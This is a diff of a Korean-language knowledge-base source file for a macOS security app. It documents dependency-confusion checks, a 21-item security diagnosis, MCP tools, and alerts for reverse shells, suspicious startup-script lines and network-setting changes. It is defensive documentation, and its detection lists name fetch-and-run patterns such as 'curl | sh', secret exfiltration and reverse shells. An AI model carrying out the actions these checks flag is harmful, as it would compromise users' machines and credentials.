+                • 보고하는 내용: ①`pip_extra_index_url` — requirements*.txt, pip.conf, pyproject.toml, uv.toml의 `--extra-index-url` / `extra-index-url` 줄. pip는 해당 출처와 PyPI를 모두 찾아 가장 높은 버전을 고르므로, 같은 이름이면서 버전이 더 높은 공개 패키지가 선택됩니다. ②`npm_scope_not_pinned` — npm 락 파일(package-lock.json, npm-shrinkwrap.json, yarn.lock v1, pnpm-lock.yaml)이 @스코프 패키지를 npmjs.org가 아닌 레지스트리에서 설치하는데, 프로젝트 안, 등록된 폴더까지의 상위 폴더, 홈 폴더의 어떤 .npmrc에도 `@스코프:registry=` 지정이 없는 경우.
+                • 하지 않는 일: 레지스트리에 이름을 선점할 수 있는지 묻지 않고, 네트워크 요청도 보내지 않으며 아무것도 실행하지 않습니다. 결과는 설정에 대한 경고이며 공격이 성립한다는 증거가 아닙니다. 그 이름이 비공개 출처에만 존재하더라도 목록에 나옵니다. URL에 포함된 인증 정보는 버리고 호스트만 표시합니다.
+                • 대상 외: 비공개 레지스트리의 스코프 없는 npm 패키지(.npmrc로 고정할 수 없음), yarn Berry 락 파일(출처를 기록하지 않음), Poetry의 source, uv의 `[[tool.uv.index]]`, http(s)가 아닌 인덱스 URL.
+                • 여는 방법: "📦 패키지 CVE 대조" → "의존성 출처 (Pro)" 탭에서 "의존성" 탭과 동일한 프로젝트 폴더를 대상으로 합니다. MCP: `run_dependency_source_scan`(`watchedFolders` 인자, Pro 전용).
+                """,
+                recommendation: "pip는 `--extra-index-url` 대신, PyPI를 미러링하는 비공개 인덱스 하나를 `--index-url`로 지정하는 구성을 권장합니다. npm은 비공개 스코프마다 프로젝트의 .npmrc에 `@스코프:registry=<내 레지스트리>`를 추가하세요."
+            ),
+            LocalizedEntry(
                 id: "feat_port_scan_guard",
                 title: "수신 포트 스캔 탐지 (자동 차단, Pro)",
                 summary: "짧은 시간(5분) 동안 여러 개의 서로 다른 포트(15개 이상)에 접속한 발신 IP를 탐지하여 알려줍니다(nmap/masscan 등 정찰 도구의 전형적인 특징). 탐지된 스캔 발신지는 기본적으로 10분간 자동으로 차단됩니다. Pro 전용.",
@@ -672,15 +726,15 @@ extension RoamSwitchKnowledgeBase {
             ),
             LocalizedEntry(
                 id: "feat_security_health_checker",
-                title: "Mac 보안 진단 (18개 항목, 점수와 개선 단계)",
-                summary: "시스템 강화, 네트워크 방어, 인증 및 접근 제어, 포트 노출, 악성코드 보호, 물리적 기기 방어 등 6개 영역 18개 항목을 검사하여 0~100점의 점수, 등급, 실패 항목별 개선 단계를 보여줍니다. 무료 버전에서도 사용할 수 있습니다.",
+                title: "Mac 보안 진단 (21개 항목, 점수와 개선 단계)",
+                summary: "시스템 강화, 네트워크 방어, 인증 및 접근 제어, 포트 노출, 악성코드 보호, 물리적 기기 방어 등 6개 영역 21개 항목을 검사하여 0~100점의 점수, 등급, 실패 항목별 개선 단계를 보여줍니다. 무료 버전에서도 사용할 수 있습니다.",
                 details: """
-                • 시스템 강화: 1. FileVault, 2. SIP(시스템 무결성 보호), 3. Gatekeeper, 4. 자동 보안 업데이트, 5. Apple XProtect.
-                • 네트워크 방어: 6. macOS 방화벽, 7. 스텔스 모드, 8. Wi-Fi 암호화 강도, 9. ARP 스푸핑 모니터, 10. 게이트웨이 ARP 고정.
-                • 인증 및 접근 제어: 11. SSH 원격 로그인 설정(root 로그인 비활성화, 키 전용 인증), 12. sudo 권한 상승(`NOPASSWD` 감사).
-                • 서비스 및 포트 노출: 13. 노출된 포트.
-                • 악성코드 및 다운로드 보호: 14. 웹 및 이메일 보호, 15. DNS 위협 보호, 16. 피싱 및 악성 링크 보호(Safari 사기 웹사이트 경고).
-                • 물리적 포트 및 기기: 17. 무단 USB / BadUSB 물리 포트 가드, 18. macOS 액세서리 연결 보호.
+                • 시스템 강화: 1. FileVault, 2. SIP(시스템 무결성 보호), 3. Gatekeeper, 4. 자동 보안 업데이트, 5. Apple XProtect, 6. 백업(Time Machine의 가장 최근 백업이 7일 이내인지, 복원 가능 여부는 확인하지 않음).
+                • 네트워크 방어: 7. macOS 방화벽, 8. 스텔스 모드, 9. Wi-Fi 암호화 강도, 10. ARP 스푸핑 모니터, 11. 게이트웨이 ARP 고정, 12. 프록시 자동 검색 (WPAD / PAC).
+                • 인증 및 접근 제어: 13. SSH 원격 로그인 설정(root 로그인 비활성화, 키 전용 인증), 14. sudo 권한 상승(`NOPASSWD` 감사), 15. AI 에이전트 자격 증명 파일.
+                • 서비스 및 포트 노출: 16. 노출된 포트.
+                • 악성코드 및 다운로드 보호: 17. 웹 및 이메일 보호, 18. DNS 위협 보호, 19. 피싱 및 악성 링크 보호(Safari 사기 웹사이트 경고).
+                • 물리적 포트 및 기기: 20. 무단 USB / BadUSB 물리 포트 가드, 21. macOS 액세서리 연결 보호.
                 • 해당 없음 처리: 신뢰 네트워크에서의 방화벽과 스텔스 모드, 원격 로그인이 꺼져 있을 때의 SSH, 헬퍼 연결 전의 sudo 감사는 점수 계산에서 제외됩니다.
                 • 등급: 100점은 S, 85~99점은 A, 70~84점은 B, 70점 미만은 C입니다. MCP 도구 `get_security_report`로도 확인할 수 있습니다.
                 """,
@@ -727,15 +781,16 @@ extension RoamSwitchKnowledgeBase {
             ),
             LocalizedEntry(
                 id: "feat_mcp_server",
-                title: "MCP 서버 연동 (AI 도우미를 위한 읽기 전용 접근)",
-                summary: "RoamSwitch.app에는 읽기 전용 MCP(Model Context Protocol) 서버가 포함되어 있어 Claude 같은 AI 도우미가 Mac의 보안 상태를 물어볼 수 있습니다. 설정을 바꾸거나 무언가를 차단하는 도구는 없습니다.",
+                title: "MCP 서버 연동 (AI 도우미용 접근)",
+                summary: "RoamSwitch.app에는 MCP(Model Context Protocol) 서버가 포함되어 있어 Claude 같은 AI 도우미가 Mac의 보안 상태를 물어볼 수 있습니다. 설정, 보호 수준, 포트, 장치를 바꾸는 도구는 없습니다. 무언가를 기록하는 도구는 세 개뿐이며, 자신의 기록 파일에만 씁니다.",
                 details: """
                 • 전송 방식: 로컬 stdio만 사용합니다. 실행 파일: `/Applications/RoamSwitch.app/Contents/MacOS/RoamSwitchMCPServer`.
-                • 주요 도구(총 34개): `get_security_report`(보안 진단), `verify_security_findings`(진단에서 지적된 항목이 아직 남아 있는지 다시 확인, 읽기 전용), `get_exposed_ports`, `get_guard_status`, `audit_url_safety`, `audit_secrets`, `audit_mcp_configs`(MCP 클라이언트 설정 파일의 위험한 항목 점검(다른 사람이 쓴 글을 읽는 서버와 명령 실행 서버가 한 설정에 함께 있는 구성, 즉 간접 프롬프트 인젝션의 전제도 지적), 로컬·읽기 전용. 악성코드 보호 → "🧩 MCP 설정(AI 연동) 감사…"의 전용 창에서도 실행 가능), `audit_agent_setup`(AI 에이전트에게 읽히는 지시 파일·스킬·OpenClaw 설정의 위험한 내용(보이지 않는 Unicode 문자, 지시 덮어쓰기, curl | sh, 비밀 유출 형태 등) 점검, 로컬·읽기 전용. 메뉴 「악성코드 방어」→「🤖 AI 에이전트 지시 파일 감사…」 창에서도 실행 가능), `audit_security_logs`, `get_quarantine_status`, `get_notification_history`, `get_canary_status`, `get_port_anomaly_incidents`, `get_ssh_guard_incidents`(SSH 무차별 대입 기록과 최근 SSH 로그인, 읽기 전용), `get_runtime_threat_status`, `get_incident_timeline`(봉쇄 사고 타임라인),`get_detection_coverage`(RoamSwitch가 탐지할 수 있는 공격 수법과 탐지할 수 없는 공격 수법을 나열, 읽기 전용), `get_network_history`(네트워크 이력 학습), `run_package_cve_scan`, `run_package_cve_scan_languages`, `run_active_vuln_scan`(127.0.0.1로만 비파괴적 프로브를 보냄), `run_npm_audit_signatures`(외부 서버, 즉 npm 레지스트리와 통신하는 유일한 도구, Pro·옵트인), `get_app_help`(이 지식 베이스).
+                • 주요 도구(총 35개): `get_security_report`(보안 진단), `verify_security_findings`(진단에서 지적된 항목이 아직 남아 있는지 다시 확인, 읽기 전용), `get_exposed_ports`, `get_guard_status`, `audit_url_safety`, `audit_secrets`, `audit_mcp_configs`(MCP 클라이언트 설정 파일의 위험한 항목 점검(다른 사람이 쓴 글을 읽는 서버와 명령 실행 서버가 한 설정에 함께 있는 구성, 즉 간접 프롬프트 인젝션의 전제도 지적), 로컬·읽기 전용. 악성코드 보호 → "🧩 MCP 설정(AI 연동) 감사…"의 전용 창에서도 실행 가능), `audit_agent_setup`(AI 에이전트에게 읽히는 지시 파일·스킬·OpenClaw 설정의 위험한 내용(보이지 않는 Unicode 문자, 지시 덮어쓰기, curl | sh, 비밀 유출 형태 등) 점검. 같은 규칙으로 에이전트 메모리도 점검하고, 등록한 프로젝트의 `.vscode/tasks.json`(폴더를 열면 자동 실행되는 작업)과 `.github/workflows`(시크릿이 있는 환경에서 풀 리퀘스트 코드 실행, 신뢰할 수 없는 문자열의 스크립트 삽입, 커밋으로 고정하지 않은 외부 액션)도 점검. Claude Code 설정(`~/.claude`와 등록한 프로젝트의 `.claude` 폴더에 있는 `settings.json`·`settings.local.json`)에서는 확인 없이 모든 것을 실행하는 권한 모드, 모든 명령을 허용하는 지나치게 넓은 허용 규칙, 훅, API 접속처 변경도 점검하고, 확인 완료로 표시한 뒤 설정이 느슨해진 것(거부 규칙 삭제, 넓은 허용 규칙이나 훅 추가, 권한 모드 상향, 샌드박스 비활성화)도 알려 줌. 규칙과 명령의 문자는 결과에 포함하지 않음. 로컬·읽기 전용. 메뉴 「악성코드 방어」→「🤖 AI 에이전트 지시 파일 감사…」 창에서도 실행 가능), `audit_security_logs`, `get_quarantine_status`, `get_notification_history`, `get_canary_status`, `get_port_anomaly_incidents`, `get_ssh_guard_incidents`(SSH 무차별 대입 기록과 최근 SSH 로그인, 읽기 전용), `get_runtime_threat_status`, `get_incident_timeline`(봉쇄 사고 타임라인),`get_detection_coverage`(RoamSwitch가 탐지할 수 있는 공격 수법과 탐지할 수 없는 공격 수법을 나열, 읽기 전용), `get_network_history`(네트워크 이력 학습), `run_package_cve_scan`, `run_package_cve_scan_languages`, `run_active_vuln_scan`(127.0.0.1로만 비파괴적 프로브를 보냄), `run_npm_audit_signatures`(외부 서버, 즉 npm 레지스트리와 통신하는 유일한 도구, Pro·옵트인), `get_app_help`(이 지식 베이스).
                 • 프로세스 실행 기록(Pro, 읽기 전용): `search_exec_events`(실행 이벤트 검색), `get_process_tree`(프로세스의 조상·자손 트리).
                 • 리소스: `roamswitch://docs/features`, `roamswitch://docs/alerts-and-messages`, `roamswitch://docs/settings-guide`, `roamswitch://docs/troubleshooting`.
                 • 언어: 응답은 앱의 언어 설정을 따릅니다. `get_app_help`는 `language` 인자(ja / en / zh-Hans / zh-Hant / ko / de / fr / es / it / pt-PT)를 받습니다.
-                • 안전성: 읽기 전용이므로 프롬프트 주입에 조작된 AI라도 보호 수준을 바꾸거나 포트를 격리할 수 없습니다.
+                • 로컬 상태를 쓰는 도구: `run_active_vuln_scan`(결과를 로컬 스캔 기록에 추가), `audit_security_logs`(로그 패턴 기준과 알림 기록을 갱신), `run_npm_audit_signatures`(npm이 자체 캐시와 로그를 기록)는 로컬 상태를 쓰므로 MCP 읽기 전용 힌트가 거짓입니다. 설정이나 보호 수준을 바꾸는 도구는 없습니다.
+                • 안전성: 설정이나 보호 수준을 바꾸는 도구가 없으므로 프롬프트 주입에 조작된 AI라도 보호 수준을 바꾸거나 포트를 격리할 수 없습니다.
                 """,
                 recommendation: "설정 방법은 faq_mcp_setup을 참고하세요. \u{201C}지금 내 Mac이 안전한가요?\u{201D}나 \u{201C}이 알림은 무슨 뜻인가요?\u{201D}처럼 자연스러운 말로 물어볼 수 있습니다."
             ),
@@ -896,7 +951,7 @@ extension RoamSwitchKnowledgeBase {
                 """,
                 recommendation: """
                 1. 예상하지 못한 것이라면 별도의 조치는 필요 없지만, 해당 페이지에 정보를 입력하지 마세요.
-                2. 필요한 정당한 사이트가 실수로 차단되었다면 알림의 "이번만 허용(5분)"을 사용하거나 허용 목록에 추가하세요.
+                2. 필요한 정당한 사이트가 실수로 차단되었다면 알림의 "이번만 허용(5분)"을 사용하세요.
                 """
             ),
             LocalizedEntry(
@@ -1076,6 +1131,51 @@ extension RoamSwitchKnowledgeBase {
                 """
             ),
             LocalizedEntry(
+                id: "alert_new_startup_script",
+                title: "🚨 자동으로 실행되는 위치에서 의심스러운 항목이 감지되었습니다",
+                summary: "셸 시작 파일(`.zshrc` 등), `~/.ssh/rc`, 정기 스크립트, git 훅, 폴더 액션 스크립트에 의심스러운 줄이 나타났거나 의심스러운 로그인/로그아웃 훅이 설정되었을 때의 경고입니다.",
+                details: """
+                • 발생 원인: 정보 탈취형 악성코드 등이 로그인이나 부팅 때마다 자동으로 실행되도록 써 넣었거나, 사용자 본인 또는 사용 중인 도구가 파일을 편집했습니다.
+                • 자동 방어: 알림만 합니다(쓰기 자체는 막을 수 없습니다). 알림에 파일 경로, 의심스러운 줄, 판정 이유가 표시됩니다.
+                """,
+                recommendation: """
+                1. 방금 직접 그 파일을 편집했거나 도구를 설치했는지 확인하세요. 짐작 가는 것이 있으면 조치는 필요 없습니다.
+                2. 짐작 가는 것이 없다면 알림에 표시된 줄을 삭제하세요. 로그인/로그아웃 훅이라면 훅 설정 자체를 제거하세요.
+                3. 그 줄이 호출하는 프로그램도 삭제하고, Mac을 재시작한 뒤 ClamAV 검사를 실행하세요.
+                """
+            ),
+            LocalizedEntry(
+                id: "alert_reverse_shell",
+                title: "🐚 리버스 셸 의심 항목을 탐지했습니다",
+                summary: "셸이나 인터프리터의 입력과 출력이 외부 서버로의 연결로 이어져 있습니다. 공격자가 이 Mac을 원격으로 조작하고 있을 수 있습니다.",
+                details: """
+                • 알림 내용: 프로그램 경로와 PID, 상대 주소, 부모 프로세스, 명령줄입니다.
+                • 흔한 원인: 악성 패키지의 설치 스크립트, 가짜 오류 화면에 속아 붙여넣은 ClickFix 명령, 잘못 유도된 AI 에이전트가 실행한 명령 등입니다. 외부 서버에 셸을 넘기는 정상적인 원격 조작 도구에서도 나타납니다.
+                • 자동 대응: 알림만 보냅니다. 프로세스도 네트워크도 멈추지 않습니다.
+                """,
+                recommendation: """
+                1. 알림의 경로, 부모 프로세스, 명령을 보고 본인이 한 작업인지 확인한다.
+                2. 짚이는 점이 없다면 Wi-Fi를 끄거나 케이블을 뽑고 그 프로세스를 종료한다.
+                3. 시작 경로(부모 프로세스, 직전에 실행한 명령, 프로세스 실행 기록기의 기록 = feat_exec_recorder)를 조사하고, 유출되었을 수 있는 자격 증명을 변경한다.
+                4. 알고 있는 사용 방식이라면 메뉴의 '최근 리버스 셸 탐지를 허용 목록에 추가…'로 허용한다.
+                """
+            ),
+            LocalizedEntry(
+                id: "alert_network_settings_changed",
+                title: "🌐 네트워크 설정이 이전과 다릅니다",
+                summary: "연결된 네트워크가 나눠 준 DNS 서버, 라우터, 프록시 자동 구성(PAC)이 같은 네트워크의 이전 상태와 다릅니다. 가짜 DHCP 서버나 WPAD를 이용한 중간자 공격일 수 있습니다.",
+                details: """
+                • 알림 내용: 네트워크 이름과, 이전에 본 적 없는 DNS 서버, 라우터, PAC 호스트 또는 WPAD가 켜졌다는 것입니다.
+                • 무해한 원인의 예: 라우터나 통신사 교체, 설정 변경. 회사나 학교 네트워크에서 관리자가 설정을 바꾼 경우.
+                • 자동 대응: 알림만 보냅니다. 설정을 바꾸지도 통신을 차단하지도 않습니다. 같은 내용의 알림은 한 번만 보냅니다.
+                """,
+                recommendation: """
+                1. 라우터나 통신사를 바꾼 기억이 있다면 메뉴의 '네트워크 설정 기준을 현재 상태로 갱신…'으로 수락한다.
+                2. 기억이 없다면 그 네트워크 사용을 중단하고 모바일 회선 같은 신뢰할 수 있는 연결로 바꾼다.
+                3. WPAD가 켜졌다면 시스템 설정 > 네트워크 > 사용 중인 연결 > 세부사항 > 프록시에서 '프록시 자동 검색'을 끈다.
+                """
+            ),
+            LocalizedEntry(
                 id: "alert_docker_risk",
                 title: "⚠️ 위험한 Docker 컨테이너 설정 감지됨",
                 summary: "`--privileged`로 시작되었거나 `docker.sock`이 마운트된 컨테이너가 방금 시작되었음을 알립니다.",
@@ -1207,7 +1307,7 @@ extension RoamSwitchKnowledgeBase {
                 title: "Pro 활성화 시 자동으로 켜지는 가드와 선택적으로 켜는 가드",
                 summary: "Pro 라이선스를 처음 활성화하면, 주로 알림만 보내고 오탐이 적으며 추가 권한이나 설정이 필요 없는 자율 방어 가드가 자동으로 켜집니다. 일반적인 사용을 방해할 수 있는 것이나 추가 권한·설정·외부 통신이 필요한 것은 옵트인으로 남습니다. 그 후에는 각 가드에 대해 사용자가 내린 켜기/끄기 선택이 존중됩니다.",
                 details: """
-                • 자동으로 켜짐(Pro를 처음 활성화할 때 한 번): 알 수 없는 리스닝 포트 자동 차단, 수신 포트 스캔 탐지(스캔 발신지에 대한 10분간 자동 차단 포함), SSH 무차별 대입 탐지(원격 로그인이 켜져 있을 때만 동작), 랜섬웨어 미끼 파일 탐지와 엔트로피 탐지, 자격 증명 허니토큰, ARP 스푸핑 감지 시 자동 차단, XProtect 악성코드 탐지 시 자동 네트워크 차단, 자동 로그 감사, 중요 시스템 파일 변조 감시, 의존 잠금 파일 변조 감시. ARP와 XProtect 차단이 켜질 때는 이를 설명하는 일회성 안내가 표시됩니다.
+                • 자동으로 켜짐(Pro를 처음 활성화할 때 한 번): 알 수 없는 리스닝 포트 자동 차단, 수신 포트 스캔 탐지(스캔 발신지에 대한 10분간 자동 차단 포함), SSH 무차별 대입 탐지(원격 로그인이 켜져 있을 때만 동작), 랜섬웨어 미끼 파일 탐지와 엔트로피 탐지, 자격 증명 허니토큰, ARP 스푸핑 감지 시 자동 차단, XProtect 악성코드 탐지 시 자동 네트워크 차단, 자동 로그 감사, 중요 시스템 파일 변조 감시, 의존 잠금 파일 변조 감시, 리버스 셸 실시간 탐지, 네트워크 설정 변경 감시. ARP와 XProtect 차단이 켜질 때는 이를 설명하는 일회성 안내가 표시됩니다.
                 • Pro에서 기본값 켜짐: 웹 및 이메일 보호, 자동 실행 등록(LaunchAgent/Daemon) 감시, DNS 위협 보호(외출 중인 네트워크에만 적용), 링크 보호(명백한 사기 사이트 자동 차단).
                 • 기본값 꺼짐(선택적 사용): ClickFix 자동 차단, Docker 위험 탐지, BadUSB 물리 포트 가드, USB 저장장치 자동 차단, 게이트웨이 ARP/NDP 고정, Bluetooth 자동 끄기, 프로세스 실행 기록, 브라우저 자격 증명 접근 모니터링, VPN 터널, Sensor 페어링, 실증형 취약점 검증, npm 서명 검증. 이들은 각각 일반적인 사용을 방해할 수 있거나(네트워크 차단, 입력 장치, 외장 드라이브, 소리), 추가 권한이나 설치(전체 디스크 접근, 손쉬운 사용, blueutil)가 필요하거나, 허용 목록 같은 사용자 설정이 필요하거나, 외부 서버와 통신합니다. DNS 위협 보호의 제공업체는 사용자가 선택합니다.
                 • 무료 버전에서도 기본값 켜짐: 클립보드 보호(API 키와 ClickFix 명령어).
@@ -1253,13 +1353,13 @@ extension RoamSwitchKnowledgeBase {
             ),
             LocalizedEntry(
                 id: "set_link_guard_modes",
-                title: "링크 보호의 모드, 자동 업데이트, 시스템 확장, 허용 목록 (Pro)",
+                title: "링크 보호의 모드, 자동 업데이트, 시스템 확장, 임시 허용 (Pro)",
                 summary: "링크 보호의 모드, 위협 정보 자동 업데이트, 시스템 확장 승인 상태, 실수로 차단된 사이트를 허용하는 방법을 설정합니다.",
                 details: """
                 • 모드: "링크 보호(피싱 접속 감지) (Pro)" → "끔", "경고만(차단 안 함)", 또는 "명백한 피싱 사이트는 자동 차단(권장)". 경고 모드는 시스템 확장이 활성화되어 있을 때만 작동합니다.
                 • 자동 업데이트: "자동 업데이트: 켬(수신 전용)"을 클릭하면 끌 수 있습니다. 꺼도 내장 데이터와 동형 문자 탐지로 계속 동작합니다. 메뉴에 정보 버전과 도메인 수가 표시됩니다.
                 • 적용 지점: "적용 지점: 시스템 확장(DoH 대응)", "적용 지점: hosts 폴백", "시스템 확장 활성화 중…", 또는 시스템 확장 오류. 승인 대기 중일 때는 "시스템 확장 승인(시스템 설정 열기)…"이 표시됩니다.
-                • 허용/차단: 차단 알림의 "이번만 허용(5분)"으로 해당 사이트를 5분간 허용할 수 있습니다. 경고 패널에서 선택한 허용/차단은 기억됩니다.
+                • 허용/차단: 차단 알림의 "이번만 허용(5분)"과 경고 패널의 "허용"은 모두 해당 사이트를 5분간만 허용하며, 앱을 종료했다가 다시 열어도 5분 뒤에 끝납니다. 경고 패널의 "차단"은 기억됩니다.
                 """,
                 recommendation: "시스템 확장을 승인하고 자동 업데이트를 켠 상태로 자동 차단을 사용하는 것이 가장 효과적인 보호입니다."
             ),
@@ -1296,11 +1396,11 @@ extension RoamSwitchKnowledgeBase {
             LocalizedEntry(
                 id: "faq_free_vs_pro",
                 title: "무료 버전과 Pro 평생 버전의 차이",
-                summary: "무료 버전에는 네트워크 기반 자동 보호 전환, 18개 항목 보안 진단, 다양한 수동 검사 도구가 시간 제한 없이 포함되어 있습니다. Pro는 자동 봉쇄, 실시간 방어, 순찰 경고를 추가로 제공합니다.",
+                summary: "무료 버전에는 네트워크 기반 자동 보호 전환, 21개 항목 보안 진단, 다양한 수동 검사 도구가 시간 제한 없이 포함되어 있습니다. Pro는 자동 봉쇄, 실시간 방어, 순찰 경고를 추가로 제공합니다.",
                 details: """
                 【무료 버전】
                 • 네트워크별 3단계 PF 패킷 필터 자동 전환, 공유 서비스와 AirDrop 자동 정지 및 복원
-                • Mac 보안 진단(18개 항목), XProtect 상태, 파일/앱 안전성 진단
+                • Mac 보안 진단(21개 항목), XProtect 상태, 파일/앱 안전성 진단
                 • 노출된 포트와 USB 기기 목록
                 • 링크 안전성 진단, 수동 기밀/API 키 유출 감사, 클립보드 보호
                 • 패키지 CVE 검사, 실증형 취약점 검증, Mac 보안 로그 감사, 알림 기록
@@ -1456,8 +1556,8 @@ extension RoamSwitchKnowledgeBase {
                 title: "링크 보호가 정당한 사이트를 차단함 / 연결이 계속 보류됨",
                 summary: "링크 보호가 실수로 사이트를 차단했거나 경고 모드로 보류했을 때의 대처법입니다.",
                 details: """
-                • 임시로 허용: 차단 알림의 "이번만 허용(5분)".
-                • 영구적으로 허용: 경고 패널에서 "허용"을 선택하면 기억됩니다.
+                • 임시로 허용: 차단 알림의 "이번만 허용(5분)" 또는 경고 패널의 "허용". 둘 다 5분간 유지됩니다.
+                • 기억되는 선택: 경고 패널의 "차단"만 기억됩니다. "허용"은 5분간 유지됩니다.
                 • 보류된 연결이 스스로 차단됨: 경고 모드는 약 8초 안에 응답이 없으면 차단합니다(실패 시 차단). 이 결과는 캐시되지 않으므로 페이지를 다시 불러오면 다시 물어봅니다.
                 • 알림이 보이지 않음: 배너 스타일 알림에서는 버튼이 숨겨질 수 있어 최전면 패널도 함께 표시됩니다. 방해 금지 모드 중이라면 알림 기록을 확인하세요.
                 • 임시로 비활성화: 모드를 "경고만(차단 안 함)"이나 "끔"으로 전환하세요.
